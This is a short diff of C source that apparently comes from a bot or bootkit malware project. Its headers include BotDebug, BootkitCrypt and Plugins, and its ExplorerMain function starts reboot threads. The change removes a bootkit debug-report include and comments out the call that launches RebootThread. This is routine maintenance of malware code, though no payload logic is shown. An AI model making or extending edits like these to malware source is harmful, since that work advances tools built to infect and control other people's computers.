@@ -38,7 +38,6 @@
 #include "reboot.h"
 
 #include "BotDebug.h"
-#include "DbgRptBootkit.h"
 #include "DbgRpt.h"
 #include "BootkitCrypt.h"
 #include "Plugins.h"
@@ -498,7 +497,7 @@ BOOL ExplorerMain()
 		//STR::Free(fileBot);
 		DWORD thid = 0;
 		PP_DPRINTF("ExplorerMain: starting reboot thread and reboot notify thread");
-		pCreateThread(NULL, 0, RebootThread, NULL, 0, &thid);
+		//pCreateThread(NULL, 0, RebootThread, NULL, 0, &thid);
 		pCreateThread(NULL, 0, RebootNotifyThread, NULL, 0, &thid);
 	}
 
